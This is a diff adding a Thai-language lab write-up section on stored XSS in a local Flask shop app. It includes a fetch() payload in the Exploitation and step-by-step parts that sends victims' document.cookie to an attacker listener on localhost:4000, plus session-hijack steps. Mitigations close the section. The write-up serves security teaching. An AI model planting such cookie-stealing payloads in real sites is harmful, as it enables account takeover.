@@ -1,3 +1,215 @@
+### ช่องโหว่ที่ 2: Cross-Site Scripting (XSS)
+
+---
+
+#### คำอธิบายช่องโหว่
+
+Cross-Site Scripting (XSS) คือการโจมตีที่ผู้โจมตีแทรก script อันตรายเข้าไปในหน้าเว็บ
+ที่ผู้ใช้คนอื่นจะเปิดดู เมื่อเหยื่อเปิดหน้านั้น script จะทำงานใน browser ของเหยื่อ
+ภายใต้ความน่าเชื่อถือของเว็บไซต์จริง ทำให้ผู้โจมตีสามารถขโมย session cookie,
+แอบอ้างตัวตน หรือควบคุม browser ของเหยื่อได้
+
+XSS แบ่งเป็น 3 ประเภทหลัก:
+- **Stored XSS** — script ถูกบันทึกลง database และทำงานทุกครั้งที่ใครเปิดหน้านั้น
+- **Reflected XSS** — script ส่งผ่าน URL และสะท้อนกลับมาทันที ไม่มีการบันทึก
+- **DOM-based XSS** — script ถูก inject ผ่าน DOM โดยตรง ไม่ผ่าน server
+
+ช่องโหว่ในแอปนี้เป็นประเภท **Stored XSS** ซึ่งอันตรายที่สุด
+เพราะ payload ทำงานกับทุกคนที่เปิดหน้าสินค้าชิ้นนั้น ไม่ใช่แค่คนที่คลิกลิงก์
+
+**ตำแหน่งในแอปพลิเคชัน:** `POST /product/<id>/review` → `app/routes/products.py`
+และ `app/templates/product_detail.html`
+
+---
+
+#### Methodology ตาม Chapter 21
+
+**ขั้นที่ 1 — Mapping the Application (สำรวจแอปพลิเคชัน)**
+
+ระบุ endpoint ทั้งหมดที่รับ input จากผู้ใช้แล้วแสดงผลกลับออกมาในหน้าเว็บ ได้แก่:
+- `POST /product/<id>/review` — รับ `content` แล้วบันทึกและแสดงในหน้าสินค้า
+- `GET /product/<id>` — ดึง review ทั้งหมดจาก database มาแสดงผล
+
+โดยใช้ Burp Suite ดัก traffic ขณะโพสต์ review เพื่อดู request/response ที่แท้จริง
+
+**ขั้นที่ 2 — Identifying Attack Surfaces (ระบุพื้นที่เสี่ยง)**
+
+ตรวจสอบ template `product_detail.html` พบว่า:
+- แสดงผล review content ด้วย `{{ review.content | safe }}`
+- filter `| safe` ใน Jinja2 หมายถึง **ปิดการ escape HTML โดยเจตนา**
+- ทำให้ HTML tag และ JavaScript ใดๆ ที่อยู่ใน content ถูก render โดยตรง
+
+ตรวจสอบ `products.py` พบว่า:
+- `add_review()` รับ `content` จาก form และ INSERT เข้า database ทันที
+- ไม่มีการ sanitize หรือ validate input ใดๆ ก่อนบันทึก
+
+→ input ที่มี script จะถูกเก็บและแสดงผลซ้ำกับทุกคนที่เปิดหน้าสินค้า = **Stored XSS ยืนยัน**
+
+**ขั้นที่ 3 — Analyzing Inputs and Parameters (วิเคราะห์ input)**
+
+```
+POST /product/1/review HTTP/1.1
+Host: localhost:5000
+Cookie: session=<user_session_token>
+Content-Type: application/x-www-form-urlencoded
+
+content=<script>alert(document.cookie)</script>
+```
+
+ค่า `content` ไม่ผ่านการกรองใดๆ ก่อนบันทึกลง database และไม่ถูก escape ก่อนแสดงผล
+
+**ขั้นที่ 4 — Testing Hypotheses (ทดสอบสมมติฐาน)**
+
+ทดสอบโดยโพสต์ review ที่มี HTML tag พื้นฐานก่อน:
+
+```html
+<b>test</b>
+```
+
+ถ้าข้อความ "test" แสดงผลเป็นตัวหนา = ยืนยันว่า HTML ไม่ถูก escape จึงทดสอบต่อด้วย script:
+
+```html
+<script>alert(1)</script>
+```
+
+ถ้า alert popup ขึ้น = ยืนยัน XSS
+
+**ขั้นที่ 5 — Exploitation (การโจมตี)**
+
+เมื่อยืนยันได้แล้ว ใช้ payload ที่ส่ง cookie ไปยัง attacker server:
+
+```html
+<script>fetch('http://localhost:4000/?c=' + document.cookie)</script>
+```
+
+รัน attacker server รับข้อมูล:
+
+```bash
+python3 -m http.server 4000
+```
+
+ทุกคนที่เปิดหน้าสินค้านั้นจะส่ง session cookie มาให้ผู้โจมตีโดยอัตโนมัติ
+
+---
+
+#### ขั้นตอนการโจมตีแบบ Step-by-step
+
+**ขั้นที่ 1:** ผู้โจมตีล็อกอินเข้าแอปด้วย account ของตัวเอง
+
+**ขั้นที่ 2:** ผู้โจมตีเปิดหน้าสินค้า เช่น `http://localhost:5000/product/1`
+           และโพสต์ review ที่มี payload:
+```html
+<script>fetch('http://localhost:4000/?c=' + document.cookie)</script>
+```
+
+**ขั้นที่ 3:** เซิร์ฟเวอร์รับ content และ INSERT เข้า database ทันที โดยไม่กรอง
+
+**ขั้นที่ 4:** alice เปิดหน้าสินค้าเดียวกัน browser โหลด review ทั้งหมดจาก database
+
+**ขั้นที่ 5:** Jinja2 render `{{ review.content | safe }}` → script tag ถูกแทรกเข้า HTML จริง
+           Browser ของ alice อ่าน HTML และ **execute script ทันที**
+
+**ขั้นที่ 6:** script ส่ง `document.cookie` ของ alice ไปที่ `localhost:4000`
+           → ผู้โจมตีได้รับ session token ของ alice
+
+**ขั้นที่ 7:** ผู้โจมตีนำ session token ไปใส่ใน browser ของตัวเอง
+           → เข้าถึงบัญชี alice ได้ทันทีโดยไม่ต้องรู้ password
+
+#### ผลลัพธ์
+
+**ก่อนโจมตี — หน้าสินค้าปกติ ก่อนมี malicious review:**
+
+![ก่อนโจมตี](assets/images/result/xss/xss_normal.png)
+*รูปที่ 1: หน้าสินค้าก่อนที่จะมีการโพสต์ review อันตราย*
+
+**หลังโจมตีสำเร็จ — cookie ถูกส่งมายัง attacker server:**
+
+![หลังโจมตี](assets/images/result/xss/xss_hacked.png)
+*รูปที่ 2: terminal ของผู้โจมตีได้รับ session cookie ของเหยื่อ*
+
+---
+
+#### เหตุใดการโจมตีจึงสำเร็จ
+
+- Jinja2 โดยค่าเริ่มต้น **escape HTML ทุกตัวแปร** เช่น `<` จะกลายเป็น `&lt;`
+  แต่ filter `| safe` บอก Jinja2 ว่า "เชื่อใจ input นี้ ไม่ต้อง escape"
+- input ของผู้ใช้ไม่ควรถูก mark ว่า `safe` เพราะผู้ใช้คือแหล่งที่มาที่ไม่น่าเชื่อถือ
+- เซิร์ฟเวอร์ไม่ได้ sanitize input ก่อนบันทึก ทำให้ script อยู่ใน database ข้ามคืน
+  และโจมตีเหยื่อได้เรื่อยๆ แม้ผู้โจมตีจะออกจากระบบไปแล้ว
+
+> ⚠️ **หมายเหตุ:** Stored XSS อันตรายกว่า Reflected XSS เพราะไม่ต้องหลอก
+> ให้เหยื่อคลิกลิงก์พิเศษ แค่เปิดหน้าปกติของเว็บก็โดนแล้ว
+
+---
+
+#### Mitigation Strategies (วิธีแก้ไข)
+
+**วิธีที่ 1 (แนะนำ): ลบ `| safe` ออก และใช้ auto-escaping ของ Jinja2**
+
+```html
+<!-- product_detail.html — แก้จาก -->
+{{ review.content | safe }}
+
+<!-- เป็น -->
+{{ review.content }}
+```
+
+Jinja2 จะ escape `<script>` เป็น `&lt;script&gt;` โดยอัตโนมัติ
+ทำให้ browser อ่านเป็นข้อความธรรมดา ไม่ execute เป็น code
+
+**วิธีที่ 2: Sanitize input ฝั่ง server ก่อนบันทึก**
+
+```python
+# products.py — ติดตั้งก่อน: poetry add bleach
+import bleach
+
+@products_bp.route('/product/<int:product_id>/review', methods=['POST'])
+def add_review(product_id):
+    if 'user' not in session:
+        return redirect(url_for('auth.login'))
+
+    content = request.form.get('content', '')
+
+    # Sanitize: อนุญาตเฉพาะ tag ที่ปลอดภัย ลบ script ออก
+    clean_content = bleach.clean(content, tags=[], strip=True)
+
+    db = get_db()
+    db.execute(
+        'INSERT INTO reviews (user_id, username, product_id, content) VALUES (?, ?, ?, ?)',
+        (session['user']['id'], session['user']['username'], product_id, clean_content)
+    )
+    db.commit()
+    return redirect(url_for('products.product_detail', product_id=product_id))
+```
+
+**วิธีที่ 3: เพิ่ม Content Security Policy (CSP) header**
+
+```python
+# app/__init__.py
+@app.after_request
+def set_csp(response):
+    response.headers['Content-Security-Policy'] = (
+        "default-src 'self'; script-src 'self'; object-src 'none';"
+    )
+    return response
+```
+
+CSP บอก browser ว่าให้ execute script ได้เฉพาะจาก origin เดียวกันเท่านั้น
+ทำให้ inline `<script>` จาก XSS ถูก block แม้ผ่าน `| safe` มาได้
+
+| วิธี | ป้องกัน Stored XSS | ป้องกัน Reflected XSS | หมายเหตุ |
+|---|---|---|---|
+| ลบ `\| safe` | ✅ | ✅ | วิธีที่ดีที่สุด ง่ายสุด |
+| bleach.clean() | ✅ | ✅ | ป้องกันได้แม้มีคน re-add `\| safe` |
+| CSP header | ✅ (ลด impact) | ✅ (ลด impact) | Defense-in-depth ชั้นเสริม |
+
+**สรุป: ควรทำทั้งวิธีที่ 1 และ 3 ร่วมกัน**
+- วิธีที่ 1 แก้ต้นเหตุโดยตรง
+- วิธีที่ 3 เป็น safety net กรณีมีช่องโหว่อื่นที่ยังไม่รู้
+
+---
+
+
 ### ช่องโหว่ที่ 3: Cross-Site Request Forgery (CSRF)
 
 ---
